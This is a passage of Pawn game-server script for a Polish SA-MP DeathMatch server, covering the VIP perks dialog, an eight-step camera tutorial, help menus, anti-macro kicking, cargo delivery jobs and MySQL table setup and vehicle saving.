	format(tstr, sizeof(tstr), "%s"C_YELLOW"- "C_WHITE"Darmowy spawn pojazdów,\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_YELLOW"- "C_WHITE"Dostêp do wyró¿niaj¹cej rangi na czacie oraz nad g³ow¹,\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_YELLOW"- "C_WHITE"Dostêp do konsoli DJ w /klub,\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_YELLOW"- "C_WHITE"Lepszej jakoœci zestaw broni po spawnie,\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_YELLOW"- "C_WHITE"Podwójny dŸwiêk informuj¹cy o przebywaniu w pobli¿u czêœci samochodowej,\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_YELLOW"- "C_WHITE"Anty Spawn Kill wyd³u¿ony o jedn¹ sekundê,\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_YELLOW"- "C_WHITE"Dostêp do dodatkowych komend\n\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_YELLOW"Komendy VIP:\n\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"/cheats "C_YELLOW"- "C_WHITE"Wspomagacze wbudowane w serwer\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"/laser "C_YELLOW"- "C_WHITE"Dodawanie lasera do broni\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"/ufo "C_YELLOW"- "C_WHITE"Mo¿liwoœæ ljatania statkiem UFO", tstr);
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_YELLOW"VIP", tstr, "Zamknij", "");
}

CMD:tutorial(playerid, params[])
{
	if(OnTutorial[playerid]) return SendClientMessage(playerid, RED, "Ogl¹dasz ju¿ samouczek.");
	if(!Player[playerid][IsLoggedIn]) return SendClientMessage(playerid, RED, "Zaloguj siê, aby skorzystaæ z samouczka.");
	PlayAudioStreamForPlayer(playerid, TUT_AUDIO);
	TutorialC[playerid] = 0;
	SpecToggle(playerid, 1);
	SetPlayerPos(playerid, 289.925781, -1705.159179, 11.056563);
	InterpolateCameraPos(playerid, 289.925781, -1705.159179, 11.056563, 147.808502, -1574.374877, 19.577104, 12000);
	InterpolateCameraLookAt(playerid, 285.963470, -1702.198608, 11.788300, 143.569580, -1571.751464, 19.190771, 12000);
	new tutstr[1024];
	format(tutstr, sizeof(tutstr), ""C_WHITE"Witaj "C_NICK"%s "C_WHITE"na serwerze "NAZWA""C_WHITE"!\nJesteœmy serwerem DeathMatch posiadaj¹cym mnóstwo innowacji.\n\nZapraszamy Ciê do zapoznania siê z krótkim samouczkiem.", Player[playerid][Name]);
	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Samouczek [1/8]", tutstr, "Zamknij", "");
	SetTimerEx("TutNext", 12000, 0, "i", playerid);
	return OnTutorial[playerid] = true;
}

forward TutNext(playerid);
public TutNext(playerid)
{
	if(TutorialC[playerid] == 0)
	{
		TutorialC[playerid] = 1;
		SetPlayerPos(playerid, 2272.419433, 859.440551, 18.441944);
		InterpolateCameraPos(playerid, 2272.419433, 859.440551, 18.441944, 2144.347167, 992.962158, 13.837607, 12000);
		InterpolateCameraLookAt(playerid, 2268.953857, 863.035400, 18.701934, 2140.936767, 996.617980, 13.769592, 12000);
		new tutstr[1024];
		format(tutstr, sizeof(tutstr), ""C_WHITE"Na naszym serwerze podstawow¹ walut¹ jest "C_LOLIVE"EXP"C_WHITE".\nTo za niego kupisz bronie, swój w³asny dom, czy te¿ za³o¿ysz swój w³asny klan.\nSposoby na szybki zarobek znajdziesz pod komend¹ "C_LOLIVE"/info > Sposoby na szybki zarobek"C_WHITE".");
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Samouczek [2/8]", tutstr, "Zamknij", "");
		return SetTimerEx("TutNext", 12000, 0, "i", playerid);
	}
	if(TutorialC[playerid] == 1)
	{
		TutorialC[playerid] = 2;
		SetPlayerPos(playerid, 2028.789062, 1343.463500, 12.528258);
		InterpolateCameraPos(playerid, 2028.789062, 1343.463500, 12.528258, 1966.531616, 1343.364013, 17.021564, 12000);
		InterpolateCameraLookAt(playerid, 2023.789306, 1343.418090, 12.497008, 1961.536254, 1343.345947, 17.236341, 12000);
		new tutstr[1024];
		format(tutstr, sizeof(tutstr), ""C_WHITE"Na serwerze "NAZWA" "C_WHITE"jest dostêpne mnóstwo zabaw dla gracza. Uczêszczaj na nie, baw siê przy tym dobrze i jednoczeœnie zarabiaj EXP!\nZabawy znajduj¹ siê po lewej stronie ekranu. Wystêpuj¹ tak¿e jako proste atrakcje wyœwietlane na czacie.");
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Samouczek [3/8]", tutstr, "Zamknij", "");
		return SetTimerEx("TutNext", 12000, 0, "i", playerid);
	}
	if(TutorialC[playerid] == 2)
	{
		TutorialC[playerid] = 3;
		SetPlayerPos(playerid, 2027.180541, 1718.807495, 15.156533);
		InterpolateCameraPos(playerid, 2027.180541, 1718.807495, 15.156533, 2155.333740, 1677.448364, 14.884305, 12000);
		InterpolateCameraLookAt(playerid, 2031.808715, 1716.920166, 15.289331, 2160.332031, 1677.344482, 14.798373, 12000);
		new tutstr[1024];
		format(tutstr, sizeof(tutstr), ""C_WHITE"Nasz serwer posiada autorski system klanów. W klanach mo¿e byæ dwóch liderów, z czego jeden to za³o¿yciel.\nPrzy zak³adaniu klanu mo¿esz za³o¿yæ w³asn¹ dzielnicê, w³asny spawn oraz miejsce spawnu pojazdu wojennego. Wojny miêdzy klanami tocz¹ siê na ich w³asnych terenach.\n\nWiêcej informacji pod "C_LOLIVE"/info > Klany"C_WHITE".");
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Samouczek [4/8]", tutstr, "Zamknij", "");
		return SetTimerEx("TutNext", 12000, 0, "i", playerid);
	}
	if(TutorialC[playerid] == 3)
	{
		TutorialC[playerid] = 4;
		SetPlayerPos(playerid, 2351.186767, -1656.594848, 32.149074);
		InterpolateCameraPos(playerid, 2351.186767, -1656.594848, 32.149074, 2471.195312, -1659.853393, 30.440858, 12000);
		InterpolateCameraLookAt(playerid, 2356.185058, -1656.723999, 32.117824, 2474.939453, -1661.572875, 27.607982, 12000);
		new tutstr[1024];
		format(tutstr, sizeof(tutstr), ""C_WHITE"U nas znajdziesz autorski system prywatnych pojazdów.\nPrywatne pojazdy nie znikaj¹ z mapy po wyjœciu jego w³aœciciela.\nMo¿esz wybraæ swój rodzaj paliwa, jaki chcesz posiadaæ lub stuningowaæ pojazd wed³ug w³asnych potrzeb.\n\nWiêcej informacji pod "C_LOLIVE"/info > Prywatne pojazdy"C_WHITE".");
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Samouczek [5/8]", tutstr, "Zamknij", "");
		return SetTimerEx("TutNext", 12000, 0, "i", playerid);
	}
	if(TutorialC[playerid] == 4)
	{
		TutorialC[playerid] = 5;
		SetPlayerPos(playerid, 2471.195312, -1659.853393, 30.440858);
		InterpolateCameraPos(playerid, 2471.195312, -1659.853393, 30.440858, 2492.385253, -1686.808837, 14.420251, 12000);
		InterpolateCameraLookAt(playerid, 2474.703613, -1661.536621, 27.301147, 2496.884765, -1684.904785, 13.358093, 12000);
		new tutstr[1024];
		format(tutstr, sizeof(tutstr), ""C_WHITE"Na naszym serwerze znajdziesz system przedmiotów. Przedmioty mo¿esz kupowaæ oraz u¿ywaæ.\nNa serwerze wystêpuj¹ przedmioty ró¿nego typu.\n\nWiêcej informacji pod "C_LOLIVE"/info > System przedmiotów"C_WHITE".");
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Samouczek [6/8]", tutstr, "Zamknij", "");
		return SetTimerEx("TutNext", 12000, 0, "i", playerid);
	}
	if(TutorialC[playerid] == 5)
	{
		TutorialC[playerid] = 6;
		SetPlayerPos(playerid, 2492.385253, -1686.808837, 14.420257);
		InterpolateCameraPos(playerid, 2492.385253, -1686.808837, 14.420257, 2433.227539, -1660.317626, 14.744981, 12000);
		InterpolateCameraLookAt(playerid, 2496.850585, -1684.714233, 13.599766, 2432.183349, -1665.204467, 14.577044, 12000);
		new tutstr[1024];
		format(tutstr, sizeof(tutstr), ""C_WHITE"Tak, jak w realnym ¿yciu - aby zarobiæ na wszystko, musisz pracowaæ.\nNa serwerze posiadamy kilka prac, które gracz mo¿e wykonywaæ.\nPracê odbierzesz od pracodawcy znajduj¹cego siê na "C_LOLIVE"/praca"C_WHITE".");
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Samouczek [7/8]", tutstr, "Zamknij", "");
		return SetTimerEx("TutNext", 12000, 0, "i", playerid);
	}
	if(TutorialC[playerid] == 6)
	{
		TutorialC[playerid] = 7;
		InterpolateCameraPos(playerid, 1981.286743, -1426.605834, 51.895824, 1979.078247, -1630.820556, 52.912387, 12000);
		InterpolateCameraLookAt(playerid, 1981.219482, -1431.601806, 52.083282, 1979.038208, -1635.819824, 52.990509, 12000);
		InterpolateCameraLookAt(playerid, 2496.850585, -1684.714233, 13.599766, 2432.183349, -1665.204467, 14.577044, 12000);
		new tutstr[1024];
		format(tutstr, sizeof(tutstr), ""C_WHITE"Wygl¹da na to, ¿e osi¹gn¹³eœ koniec samouczka. Przedstawiliœmy Ci podstawowe elementy "NAZWA""C_WHITE".\n\nPo wiêcej informacji zajrzyj pod komendê "C_LOLIVE"/info"C_WHITE".\n\nDziêkujemy, ¿e jesteœ z nami.\n"C_ZABAWA"¯yczymy mi³ej gry!");
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Samouczek [8/8]", tutstr, "Zamknij", "");
		return SetTimerEx("TutNext", 12000, 0, "i", playerid);
	}
	if(TutorialC[playerid] == 7)
	{
		TutorialC[playerid] = 7;
		StopAudioStreamForPlayer(playerid);
    	SpecToggle(playerid, false);
    	SetPlayerVirtualWorld(playerid, 0);
    	ResetPlayerWeapons(playerid);
    	SpawnFunction(playerid);
		OnTutorial[playerid] = false;
		ShowPlayerDialog(playerid, -1, DIALOG_STYLE_MSGBOX, " ", " ", " ", "");
	}
	return 1;
}

CMD:komendy(playerid, params[]) return cmd_cmds(playerid, params);
CMD:cmd(playerid, params[]) return cmd_cmds(playerid, params);
CMD:cmds(playerid, params[]) {
	new st[1024];
	format(st, sizeof(st), ""C_WHITE"» Komendy gracza\n");
	format(st, sizeof(st), "%s"C_WHITE"» Komendy eventu\n", st);
	format(st, sizeof(st), "%s{FF0000}» Komendy administracyjne", st);
	return ShowPlayerDialog(playerid, DIALOG_CMDHELP, DIALOG_STYLE_LIST, ""NAZWA" "C_WHITE"» Dostêpne komendy", st, "Wybierz", "Cofnij"); }

CMD:info(playerid, params[])
{
	new tstr[2048];
	format(tstr, sizeof(tstr), "{428FF4}» "C_WHITE"Uruchom samouczek {428FF4}("C_WHITE"/tutorial{428FF4})\n");
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Informacje ogólne\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Atrakcje dla graczy\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» O gospodarce serwera\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Sposoby na szybki zarobek\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Prywatne pojazdy\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Skiny na bronie\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Areny\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Questy\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Potwory\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Klany\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» Osi¹gniêcia\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» System eventów\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"» System przedmiotów\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_YELLOW"» "C_WHITE"Uprawnienia "C_YELLOW"VIP", tstr);
	return ShowPlayerDialog(playerid, DIALOG_INFO, DIALOG_STYLE_LIST, NAZWA, tstr, "Wybierz", "Zamknij");
}

public OnPlayerWeaponShot( playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ ) {
    if( hittype != BULLET_HIT_TYPE_NONE ) {
        if( !( -1000.0 <= fX <= 1000.0 ) || !( -1000.0 <= fY <= 1000.0 ) || !( -1000.0 <= fZ <= 1000.0 ) ) { return 0; } }
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && weaponid == 24){

		fAutoC[playerid] ++;

		if(gettime() > GetPVarInt(playerid, "UmSegundo")){

			SetPVarInt(playerid, "UmSegundo", gettime() + 1);
			fAutoC[playerid] = 0;

		}else{
			if(fAutoC[playerid] > 4){
    			new msgs[256];
				format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Macro"C_RED")", Player[playerid][Name], playerid);
 				SendClientMessageToAll(WHITE, msgs);
				fAutoC[playerid] = 0;
				DelayedKick(playerid);
				return kicks++;
			}
		}
	}
	if(ReflexType == 13 && weaponid == 24) {
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
	if(ReflexType == 14 && weaponid == 25) {
		ReflexType = -1;
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
	if(ReflexType == 15 && weaponid == 31) {
		ReflexType = -1;
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
    return 1; }

forward Zaladunek(playerid);
public Zaladunek(playerid)
{
	SpeZal[playerid] += 25;
	if(SpeZal[playerid] >= 100)
	{
	    SendClientMessage(playerid, -1, ""PYTAJNIK""C_ORANGE"Dostarcz towar do {FF0000}czerwonego punktu "C_ORANGE"zaznaczonego na mapie.");
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Za³adunek towaru", ""C_GREEN"Towar za³adowany. Szerokiej drogi!", "Zamknij", "");
		SpeZal[playerid] = 0;
		return TogglePlayerControllable(playerid, 1);
	}
	SetTimerEx("Zaladunek", 1500, 0, "i", playerid);
	new spedtd[256];
	format(spedtd, sizeof(spedtd), ""C_BLUE1"Towar jest ³adowany.\nUkoñczono "C_WHITE"%d "C_BLUE1"procent.", SpeZal[playerid]);
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Za³adunek towaru", spedtd, "Zamknij", "");
}

forward Rozladunek(playerid);
public Rozladunek(playerid)
{
	SpeZal[playerid] += 25;
	if(SpeZal[playerid] >= 100)
	{
	    ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Roz³adunek towaru", ""C_GREEN"Towar roz³adowany pomyœlnine.", "Zamknij", "");
	    EndSpedycja(playerid);
	    SpeZal[playerid] = 0;
		return TogglePlayerControllable(playerid, 1);
	}
	SetTimerEx("Rozladunek", 1500, 0, "i", playerid);
	new spedtd[256];
	format(spedtd, sizeof(spedtd), ""C_BLUE1"Towar jest roz³adowywany.\nUkoñczono "C_WHITE"%d "C_BLUE1"procent.", SpeZal[playerid]);
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Roz³adunek towaru", spedtd, "Zamknij", "");
}

forward EndSpedycja(playerid);
public EndSpedycja(playerid)
{
	new ends[256];
	if(SpeType[playerid] == 1) format(ends, sizeof(ends), ""PYTAJNIK""C_NICK"%s(%d) {F9C05C}ukoñczy³ spedycjê naziemn¹. ("C_WHITE"%d EXP{F9C05C})", Player[playerid][Name], playerid, SpeScore[playerid]);
	if(SpeType[playerid] == 2 || SpeType[playerid] == 3)
	{
		format(ends, sizeof(ends), ""PYTAJNIK""C_NICK"%s(%d) {F9C05C}ukoñczy³ spedycjê powietrzn¹. ("C_WHITE"%d EXP{F9C05C})", Player[playerid][Name], playerid, SpeScore[playerid]);
	}
	if(SpeType[playerid] == 4) format(ends, sizeof(ends), ""PYTAJNIK""C_NICK"%s(%d) {F9C05C}ukoñczy³ spedycjê morsk¹. ("C_WHITE"%d EXP{F9C05C})", Player[playerid][Name], playerid, SpeScore[playerid]);
	SendClientMessageToAll(-1, ends);
	AddExp(playerid, SpeScore[playerid]);
	Player[playerid][Cash] += random(20000);
	DestroyVehicle(Speveh[playerid]);
	SetPlayerVirtualWorld(playerid, 0);
	DisableRemoteVehicleCollisions(playerid, 0);
	DisablePlayerRaceCheckpoint(playerid);
	NaSpedycji[playerid] = false;
	SpeType[playerid] = 0;
	SpeScore[playerid] = 0;
	SpawnFunction(playerid);
	return 1;
}

forward ForceEndSpedycja(playerid);
public ForceEndSpedycja(playerid)
{
	DestroyVehicle(Speveh[playerid]);
	SetPlayerVirtualWorld(playerid, 0);
	DisableRemoteVehicleCollisions(playerid, 0);
	DisablePlayerRaceCheckpoint(playerid);
	NaSpedycji[playerid] = false;
	SpeType[playerid] = 0;
	SpeScore[playerid] = 0;
	SpawnFunction(playerid);
	return 1;
}

//-----------------------------------------------------

forward OnPlayerRegister(playerid);
public OnPlayerRegister(playerid)
{
	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_ORANGE"Rejestracja", ""C_ORANGE"Proces rejestracji zakoñczony pomyœlnie! Zosta³eœ automatycznie zalogowany.", "Dalej", "");

	Player[playerid][IsLoggedIn] = true;

	Player[playerid][X_Pos] = DEFAULT_POS_X;
	Player[playerid][Y_Pos] = DEFAULT_POS_Y;
	Player[playerid][Z_Pos] = DEFAULT_POS_Z;
	Player[playerid][A_Pos] = DEFAULT_POS_A;

	Player[playerid][Cash] += 1000;
	AddExp(playerid, 100);

	//SetSpawnInfo(playerid, NO_TEAM, 0, Player[playerid][X_Pos], Player[playerid][Y_Pos], Player[playerid][Z_Pos], Player[playerid][A_Pos], 0, 0, 0, 0, 0, 0);
	SpawnFunction(playerid);
	new sc = random(311);
	SetSpawnInfo(playerid, NO_TEAM, sc, 2121.8608,1001.0126,10.8203, 0.0, 0, 0, 0, 0, 0, 0);
	SetPlayerSkin(playerid, sc);
	return 1;
}

forward _KickPlayerDelayed(playerid);
public _KickPlayerDelayed(playerid)
{
	Kick(playerid);
	return 1;
}


//-----------------------------------------------------

DelayedKick(playerid, time = 500)
{
	SetTimerEx("_KickPlayerDelayed", time, false, "d", playerid);
	return 1;
}

SetupSpeditionsTable()
{
	mysql_query("SELECT * FROM transport");
	mysql_store_result();
	if(mysql_num_rows() > 0) return 1;
	mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `transport` (`id` int(11) NOT NULL DEFAULT '-1',`type` int(11) NOT NULL DEFAULT '-1',`name` varchar(64) NOT NULL,`x` float NOT NULL DEFAULT '0',`y` float NOT NULL DEFAULT '0',`z` float NOT NULL DEFAULT '0',PRIMARY KEY (`id`),UNIQUE KEY `id` (`id`))");
	return 1;
}

SetupBansTable()
{
	mysql_query("SELECT * FROM bans");
	mysql_store_result();
	if(mysql_num_rows() > 0) return 1;
	mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `bans` (`uid` int(11) NOT NULL DEFAULT '-1',`bantime` int(11) NOT NULL DEFAULT '-1',`ip` varchar(16) NOT NULL,`adminname` varchar(20) NOT NULL,`reason` varchar(32) NOT NULL,`isperm` int(11) NOT NULL DEFAULT '0',`expire` int(11) NOT NULL DEFAULT '-1',PRIMARY KEY (`uid`),UNIQUE KEY `uid` (`uid`))");
	return 1;
}

SetupReportsTable()
{
	mysql_query("SELECT * FROM raporty");
	mysql_store_result();
	if(mysql_num_rows() > 0) return 1;
	mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `raporty` (`reportedid` int(11) NOT NULL DEFAULT '-1',`reportingname` varchar(20) NOT NULL DEFAULT '-1',`reason` varchar(32) NOT NULL DEFAULT '-1',`time` int(11) NOT NULL DEFAULT '-1',PRIMARY KEY (`time`),UNIQUE KEY `ticket` (`time`))");
	return 1;
}

SetupSupportTable()
{
	mysql_query("SELECT * FROM support");
	mysql_store_result();
	if(mysql_num_rows() > 0) return 1;
	mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `support` (`ticket` int(11) NOT NULL DEFAULT '-1',`suid` int(11) NOT NULL DEFAULT '-1',`ruid` int(11) DEFAULT '-1',`subject` varchar (256) NOT NULL,`lastmsg` varchar(256) NOT NULL,`lastreply` varchar(256) NOT NULL,`time` bigint(20) NOT NULL DEFAULT '-1',`status` tinyint(4) NOT NULL DEFAULT '-1',PRIMARY KEY (`ticket`),UNIQUE KEY `ticket` (`ticket`))");
	return 1;
}

SetupConnectsTable()
{
	mysql_query("SELECT * FROM connects");
	mysql_store_result();
	if(mysql_num_rows() > 0) return 1;
	mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `connects` (`id` int(11) NOT NULL DEFAULT '-1',`ip` varchar(16) NOT NULL,PRIMARY KEY (`id`),UNIQUE KEY `id` (`id`))");
	return 1;
}

SetupStatsTable()
{
	new sqlquery[1024];
	m_query("SELECT * FROM serverstats");
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
		mysql_fetch_row(sqlquery, " ");
		sscanf(sqlquery, "iiiiiii", record, daily, connects, kicks, bans, eq, pokemons);
		mysql_free_result();
	    return 1;
	}
	mysql_free_result();
	new sqlstring[2056];
	format(sqlstring, sizeof(sqlstring), "CREATE TABLE IF NOT EXISTS `serverstats` (`record` int(11) NOT NULL DEFAULT 0,`daily` int(11) NOT NULL DEFAULT 0,`connects` int(11) NOT NULL DEFAULT 0,`kicks` int(11) NOT NULL DEFAULT 0,`bans` int(11) NOT NULL DEFAULT 0,`eq` int(11) NOT NULL DEFAULT 0,`pokemons` int(11) NOT NULL DEFAULT 0)");
	mysql_query(sqlstring);
	mysql_query("INSERT INTO `serverstats` (`record`,`daily`,`connects`,`kicks`,`bans`,`eq`,`pokemons`) VALUES (0,0,0,0,0,0,0)");
	record = 0;
	daily = 0;
	connects = 0;
	kicks = 0;
	bans = 0;
	return 1;
}

SetupClansTable()
{
	m_query("SELECT * FROM clans");
	mysql_store_result();
	if(mysql_num_rows() > 0) return mysql_free_result();
	new sqlstring[2056];
	format(sqlstring, sizeof(sqlstring), "CREATE TABLE IF NOT EXISTS `clans` (`uid` int(11) NOT NULL DEFAULT '-1',`name` varchar(17) NOT NULL DEFAULT '0',`color` int(11) NOT NULL DEFAULT '-1',`tag` varchar(7) NOT NULL DEFAULT '0',`spawnx` float NOT NULL DEFAULT '0',`spawny` float NOT NULL DEFAULT '0',`spawnz` float NOT NULL DEFAULT '0',");
	format(sqlstring, sizeof(sqlstring), "%s`vx` float NOT NULL DEFAULT '0',`vy` float NOT NULL DEFAULT '0',`vz` float NOT NULL DEFAULT '0',`va` float NOT NULL DEFAULT '0',`minx` float NOT NULL DEFAULT '0',`miny` float NOT NULL DEFAULT '0',`maxx` float NOT NULL DEFAULT '0',`maxy` float NOT NULL DEFAULT '0',`respekt` int(11) NOT NULL DEFAULT '0',`lider1` int(11) NOT NULL DEFAULT '-1',`lider2` int(11) NOT NULL DEFAULT '-1',PRIMARY KEY (`uid`),UNIQUE KEY `uid` (`uid`))", sqlstring);
	mysql_query(sqlstring);
	return 1;
}

SetupPartsTable()
{
	m_query("SELECT * FROM parts");
	mysql_store_result();
	if(mysql_num_rows() > 0) return mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `parts` (`pid` int(11) NOT NULL DEFAULT '-1',`x` float NOT NULL DEFAULT '0',`y` float NOT NULL DEFAULT '0',`z` float NOT NULL DEFAULT '0',PRIMARY KEY (`pid`),UNIQUE KEY `pid` (`pid`))");
	return 1;
}

SetupArrowsTable()
{
	m_query("SELECT * FROM arrows");
	mysql_store_result();
	if(mysql_num_rows() > 0) return mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `arrows` (`aid` int(11) NOT NULL DEFAULT '-1',`name` varchar(32) NOT NULL DEFAULT '0',`x` float NOT NULL DEFAULT '0',`y` float NOT NULL DEFAULT '0',`z` float NOT NULL DEFAULT '0',`x2` float NOT NULL DEFAULT '0',`y2` float NOT NULL DEFAULT '0',`z2` float NOT NULL DEFAULT '0',PRIMARY KEY (`aid`),UNIQUE KEY `aid` (`aid`))");
	return 1;
}

SetupParksTable()
{
	m_query("SELECT * FROM parks");
	mysql_store_result();
	if(mysql_num_rows() > 0) return mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `parks` (`pid` int(11) NOT NULL DEFAULT '-1',`x` float NOT NULL DEFAULT '0',`y` float NOT NULL DEFAULT '0',`z` float NOT NULL DEFAULT '0',PRIMARY KEY (`pid`),UNIQUE KEY `pid` (`pid`))");
	return 1;
}

SetupVehiclesTable()
{
	m_query("SELECT * FROM vehicles");
	mysql_store_result();
	if(mysql_num_rows() > 0) return mysql_free_result();
	m_query("CREATE TABLE IF NOT EXISTS `vehicles` (`vid` int(11) NOT NULL DEFAULT '-1',`model` int(11) NOT NULL DEFAULT '-1',`x` float NOT NULL DEFAULT '0',`y` float NOT NULL DEFAULT '0',`z` float NOT NULL DEFAULT '0',`a` float NOT NULL DEFAULT '0',PRIMARY KEY (`vid`),UNIQUE KEY `vid` (`vid`))");
	return 1;
}

SetupPrivcarsTable()
{
	m_query("SELECT * FROM privcars");
	mysql_store_result();
	if(mysql_num_rows() > 0) return mysql_free_result();
	new sqlstring[2056];
	format(sqlstring, sizeof(sqlstring), "CREATE TABLE IF NOT EXISTS `privcars` (`cid` int(11) NOT NULL DEFAULT '-1',`ownername` varchar(128) NOT NULL DEFAULT '0',`ownerid` int(11) NOT NULL DEFAULT '-1',`modelid` smallint(6) NOT NULL DEFAULT '-1',`ccolor1` smallint(6) NOT NULL DEFAULT '1',`ccolor2` smallint(6) NOT NULL DEFAULT '1',`fuel` float NOT NULL DEFAULT '50',`fueltype` tinyint(4) NOT NULL DEFAULT '0',`x` float NOT NULL DEFAULT '0',`y` float NOT NULL DEFAULT '0',`z` float NOT NULL DEFAULT '0',");
	format(sqlstring, sizeof(sqlstring), "%s`a` float NOT NULL DEFAULT '0',`neontype` tinyint(4) NOT NULL DEFAULT '-1',`dist` float NOT NULL DEFAULT '0',`paintjob` int(11) NOT NULL DEFAULT '0',`comp` varchar(128) NOT NULL DEFAULT '0 0 0 0 0 0 0 0 0 0 0 0 0 0', PRIMARY KEY (`cid`),UNIQUE KEY `cid` (`cid`))", sqlstring);
	mysql_query(sqlstring);
	return 1;
}

forward SavePrivcars();
public SavePrivcars()
{
	Loop(playerid, MAX_PLAYERS) {
		if(IsPlayerConnected(playerid)) {
			TextDrawShowForPlayer(playerid, SV0);
			TextDrawShowForPlayer(playerid, SV1); } }
	Loop(privcarid, privcars)
	{
		if(OnMap[privcarid])
		{
			new comp[14];
			Loop(slotid, 14) comp[slotid] = GetVehicleComponentInSlot(ppVeh[privcarid], slotid);
			m_query("UPDATE privcars SET comp = '%d %d %d %d %d %d %d %d %d %d %d %d %d %d' WHERE cid = %d", comp[0], comp[1], comp[2], comp[3], comp[4], comp[5], comp[6], comp[7], comp[8], comp[9], comp[10], comp[11], comp[12], comp[13], privcarid);
		    new sql[1024];
			format(sql, sizeof(sql), "UPDATE privcars SET ownername = '%s', modelid = %d, ccolor1 = %d, ccolor2 = %d, fuel = %.1f, fueltype = %d, x = %.3f, y = %.3f, z = %.3f, a = %.3f, neontype = %d, dist = %.1f, paintjob = %d, upgrade = %d WHERE cid = %d", pOwnerN[privcarid], pModel[privcarid], pColor[privcarid][0], pColor[privcarid][1], pFuel[privcarid], pFuelT[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid], prA[privcarid], pNeon[privcarid],
				pDist[privcarid], pPaint[privcarid], pUpgrade[privcarid], privcarid);
